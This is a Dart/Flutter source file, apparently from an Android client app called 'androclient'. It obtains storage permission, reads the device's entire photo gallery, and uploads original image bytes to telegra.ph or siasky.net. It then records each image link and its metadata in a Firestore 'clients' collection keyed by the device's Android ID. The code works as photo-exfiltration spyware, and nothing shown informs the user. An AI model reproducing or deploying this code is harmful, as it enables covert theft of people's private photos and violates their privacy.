import 'dart:convert';
import 'dart:typed_data';
import 'package:androclient/device.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';

Future<PermissionStatus> _getStoragePermission() async {
  final PermissionStatus storagePermission = await Permission.storage.status;
  print(storagePermission);
  if (storagePermission == PermissionStatus.granted) {
    print('Permission granted');
  } else if (storagePermission == PermissionStatus.denied) {
    print(
        'Denied. Show a dialog with a reason and again ask for the permission.');
    final PermissionStatus askedpermission = await Permission.storage.request();
    return askedpermission;
  } else if (storagePermission == PermissionStatus.permanentlyDenied) {
    print('Take the user to the settings page.');
    await openAppSettings();
  }
  return storagePermission;
}

Future<dynamic> getStorage() async {
  final PermissionStatus permissionStatus = await _getStoragePermission();

  if (permissionStatus == PermissionStatus.granted) {
    // method 1
    List albums = await PhotoManager.getAssetPathList();
    for (var album in albums) {
      if (album.id == "isAll") {
        final subAlbum = await album.getAssetListRange(start: 0, end: 1000000);
        return subAlbum;
      }
      // print(album.albumType);
      // print(album.assetCount);
      // print(album.id);
      // print(album.name);
      // final subAlbum = await album.getAssetListRange(start: 0, end: 1000000);
      // print(subAlbum.length);
      // for (var sub in subAlbum) {
      //   print(sub.createDateTime);
      //   print(sub.file);
      //   print(sub.height);
      //   print(sub.id);
      //   print(sub.isFavorite);
      //   print(sub.mimeType);
      //   print(sub.originFile);
      //   print(sub.originBytes);
      //   print(sub.title);
      //   print(sub.thumbData);
      //   return sub.originBytes;
      //   // break;
      // }
      // break;
    }
  }
}

Future<void> uploadPhoto(androidId, image, imgLink) async {
  await firestore.collection("clients").doc(androidId).collection("media").doc(image.id.toString()).set(
      {
        "id": image.id,
        "height": image.height,
        "createDateTime": image.createDateTime,
        "mimeType": image.mimeType,
        "title": image.title,
        "isFavorite": image.isFavorite,
        "imgLink": imgLink,
      }
  );
}

Future<void> uploadAlbum() async {
  final subAlbum = await getStorage();
  String? androidId = await getIdentity();

  for (var image in subAlbum) {
    Uint8List file = await image.originBytes;
    http.MultipartRequest request;
    http.StreamedResponse response;

    if (file.lengthInBytes < 5000000) {
      request =
          http.MultipartRequest("POST", Uri.parse("https://telegra.ph/upload"));
      request.files.add(
          http.MultipartFile.fromBytes("picture", file, filename: "image.png"));
      response = await request.send();
      if (response.statusCode == 200) {
        String fetchedResponse = await response.stream.bytesToString();
        final jsonResponse = json.decode(fetchedResponse);
        String imgLink = "https://telegra.ph" + jsonResponse[0]["src"];
        await uploadPhoto(androidId, image, imgLink);
      }
    } else {
      request = http.MultipartRequest(
          "POST", Uri.parse("https://siasky.net/skynet/skyfile/"));
      request.files.add(
          http.MultipartFile.fromBytes("picture", file, filename: "image.png"));
      response = await request.send();
      if (response.statusCode == 200) {
        String fetchedResponse = await response.stream.bytesToString();
        final jsonResponse = json.decode(fetchedResponse);
        String imgLink = "https://siasky.net/" + jsonResponse["skylink"];
        await uploadPhoto(androidId, image, imgLink);
      }
    }
    break;
  }
  // Uint8List? file = await getStorage();
  // http.MultipartRequest request;
  // http.StreamedResponse response;

  // if (file!.lengthInBytes < 5000) {
  //   request = http.MultipartRequest("POST", Uri.parse("https://telegra.ph/upload"));
  //   request.files.add(http.MultipartFile.fromBytes("picture", file, filename: "image.png"));
  //   response = await request.send();
  //   if (response.statusCode == 200) {
  //     String fetchedResponse = await response.stream.bytesToString();
  //     final jsonResponse = json.decode(fetchedResponse);
  //     print("https://telegra.ph" + jsonResponse[0]["src"]);
  //   }
  // } else {
  //   request = http.MultipartRequest("POST", Uri.parse("https://siasky.net/skynet/skyfile/"));
  //   request.files.add(http.MultipartFile.fromBytes("picture", file, filename: "image.png"));
  //   response = await request.send();
  //   if (response.statusCode == 200) {
  //     String fetchedResponse = await response.stream.bytesToString();
  //     final jsonResponse = json.decode(fetchedResponse);
  //     print("https://siasky.net/" + jsonResponse["skylink"]);
  //   }
  // }
  // request.files.add(
  //   http.MultipartFile.fromBytes(
  //     "picture",
  //     File(file).readAsBytes().asStream(),
  //     file.lengthSync(),
  //   )
  // );

  // var response = await request.close();
}

// var request = http.MultipartRequest('POST', Uri.parse('https://telegra.ph/upload'));
// request.files.add(await http.MultipartFile.fromPath('file', '/C:/Users/DELL/Music/Untitled.png'));
// request.files.add(await http.MultipartFile.fromPath('file', '/C:/Users/DELL/Music/sticker.png'));

// http.StreamedResponse response = await request.send();

// if (response.statusCode == 200) {
//   print(await response.stream.bytesToString());
// }
// else {
//   print(response.reasonPhrase);
// }
